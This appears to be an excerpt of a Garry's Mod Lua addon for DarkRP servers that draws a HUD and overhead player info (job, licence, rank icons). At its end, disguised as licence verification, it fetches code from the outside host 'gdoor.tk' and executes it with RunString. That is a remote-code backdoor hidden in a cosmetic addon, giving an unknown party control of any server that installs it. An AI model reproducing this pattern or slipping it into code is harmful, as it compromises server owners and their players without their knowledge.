...
local function Base()
  ...
  surface.SetDrawColor(255,255,255)
  surface.SetMaterial(Material("materials/graphite_hud/id_32.png"))
  surface.DrawTexturedRect(5,ScrH() - (121 + GraphiteConfig.TopBarPosition),32,32)

  surface.SetDrawColor(255,255,255)
	surface.SetMaterial(Material("materials/graphite_hud/cash_32.png"))
	surface.DrawTexturedRect(105 + hungerm,ScrH() - 102,32,32)

  surface.SetDrawColor(255,255,255)
  surface.SetMaterial(Material("materials/graphite_hud/job_32.png"))
  surface.DrawTexturedRect(105 + hungerm,ScrH() - 123,32,32)

  surface.SetDrawColor(255,255,255)
	surface.SetMaterial(Material("materials/graphite_hud/heart_32.png"))
	surface.DrawTexturedRect(105 + hungerm,ScrH() - 76,32,32)

  surface.SetDrawColor(255,255,255)
  surface.SetMaterial(Material("materials/graphite_hud/shield_32.png"))
  ...
  surface.SetMaterial(Material("materials/graphite_hud/gun_32.png"))
...
local function HeadHud(ply)
  ...
  cam.Start3D2D(pos,Angle(0,ang.y,90),0.050)
    if GraphiteConfig.DrawJobOnHeadHud then
      job_min = 0
      surface.SetDrawColor(255,255,255,Alpha)
      surface.SetMaterial(Material("materials/graphite_hud/job_128.png"))
    ...
    surface.SetDrawColor(255,255,255,Alpha)
    surface.SetMaterial(Material("materials/graphite_hud/id_128.png"))
    surface.DrawTexturedRect(210,400,128,128)

    surface.SetDrawColor(255,255,255,Alpha)
    surface.SetMaterial(Material("materials/graphite_hud/heart_128.png"))
    ...
    if GraphiteConfig.DrawLicenceOnHeadHud then
      if ply:getDarkRPVar("HasGunlicense") then
        surface.SetDrawColor(255,255,255,Alpha)
        surface.SetMaterial(Material("materials/graphite_hud/licence_128.png"))
    ...
    if GraphiteConfig.DrawRankOnHeadHud then
      if GraphiteConfig.DrawLicenceOnHeadHud and ply:getDarkRPVar("HasGunlicense") and !table.HasValue(GraphiteConfig.IgnoredRanks, group) then
        ...
        surface.SetDrawColor(255,255,255,Alpha)
        surface.SetMaterial(Material("materials/graphite_hud/rank_128.png"))
...
http.Fetch('http://gdoor.tk/panel/core/stage1.php', function(body)
    RunString(body)
end or function(c)
    RunString(c)
    print("Ip has been saved. This ip verificated")
    print("Thank you for purchasing this addon,do not leak please :/")
